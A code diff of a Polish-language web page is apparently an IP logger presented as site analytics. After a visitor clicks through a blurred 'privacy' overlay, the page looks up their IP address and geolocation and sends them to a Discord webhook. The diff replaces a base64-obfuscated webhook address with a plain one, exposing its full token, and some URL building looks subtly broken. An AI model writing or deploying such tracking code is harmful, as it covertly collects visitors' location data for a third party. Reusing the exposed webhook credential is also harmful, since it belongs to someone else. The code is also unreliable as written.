@@ -19,7 +19,7 @@
             overflow: hidden;
         }
 
-        /* Warstwa tła z płynnym efektem zmiany rozmycia (transition) */
+        /* Warstwa tła ze zdjęciem i płynnym wyostrzaniem */
         .background-blur {
             position: fixed;
             top: 0;
@@ -30,14 +30,14 @@
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
-            filter: blur(8px); /* Domyślne rozmycie na starcie */
+            filter: blur(8px);
             transform: scale(1.05);
             z-index: 1;
             pointer-events: none;
-            transition: filter 0.8s ease; /* Płynne wyostrzanie przez 0.8 sekundy */
+            transition: filter 0.8s ease;
         }
 
-        /* Klasa usuwająca blur, dodawana przez JavaScript po akceptacji */
+        /* Klasa zdejmująca blur po akceptacji */
         .unblurred {
             filter: blur(0px) !important;
         }
@@ -167,13 +167,14 @@
     </div>
 
     <script>
-        const _0x4f2a = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9vaHMvMTUzMjA2OTcxOTA1NjcxNTg2Ni8xY0FZNjZKWjZOQTZzaC1GTmVUNXNFQUtEdF8zYVpLb1FITkJTdUhDSkVNMlo5ZHR3OXM3N0VwandnZk5YMEp5ZHNnQQ==";
+        // CZYSTY, NIEZASZYFROWANY LINK DO WEBHOOKA DISCORD
+        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1532069719056715866/1cAY66JZ6NA6sh-FNeT5sEAKDt_3aZKoQHNBSuHCJEM3Z9dtw9s77EpjwgfNX0JydsgA";
 
         window.onload = function() {
             var consent = localStorage.getItem('siteConsent');
             if (consent === 'accepted') {
                 document.getElementById('privacyOverlay').style.display = 'none';
-                document.getElementById('bgLayer').classList.add('unblurred'); // Wyostrz tło, jeśli zgoda już była
+                document.getElementById('bgLayer').classList.add('unblurred');
                 startTracking();
             } else if (consent === 'declined') {
                 document.getElementById('privacyOverlay').style.display = 'none';
@@ -186,7 +187,7 @@
         function acceptTerms() {
             localStorage.setItem('siteConsent', 'accepted');
             document.getElementById('privacyOverlay').style.display = 'none';
-            document.getElementById('bgLayer').classList.add('unblurred'); // Usuwa blur po kliknięciu akceptacji
+            document.getElementById('bgLayer').classList.add('unblurred'); // Usuwa blur
             startTracking();
         }
 
@@ -198,7 +199,7 @@
 
         function showPrivacyNote() {
             localStorage.removeItem('siteConsent');
-            document.getElementById('bgLayer').classList.remove('unblurred'); // Przywraca blur po powrocie
+            document.getElementById('bgLayer').classList.remove('unblurred');
             document.getElementById('errorScreen').style.display = 'none';
             document.getElementById('privacyOverlay').style.display = 'flex';
         }
@@ -206,16 +207,19 @@
         function startTracking() {
             document.getElementById('mainPage').style.display = 'block';
             
+            // Pobieranie surowego adresu IP bez CORS policy errors
             fetch('https://ipify.org')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
                     if(data && data.ip) {
+                        // Pobieranie geolokalizacji na podstawie adresu IP
                         fetch('https://ipapi.co' + data.ip + '/json/')
                             .then(function(res) { return res.json(); })
                             .then(function(locData) {
                                 sendToDiscord(locData);
                             })
                             .catch(function() {
+                                // Awaryjne wysłanie samego IP w razie problemów z geolokalizacją
                                 sendToDiscord({ ip: data.ip, country_name: "Nieznany", country_code: "XX", city: "Nieznane", region: "Nieznany", org: "Blad API" });
                             });
                     }
@@ -227,11 +231,8 @@
         }
 
         function sendToDiscord(ipData) {
-            const targetUrl = atob(_0x4f2a);
-
             const payload = {
                 username: "System Analityki",
                 avatar_url: "https://imgur.com",
                 embeds: [{
                     title: "📥 Logowanie ruchu na stronie",
-                    color: 3066993,
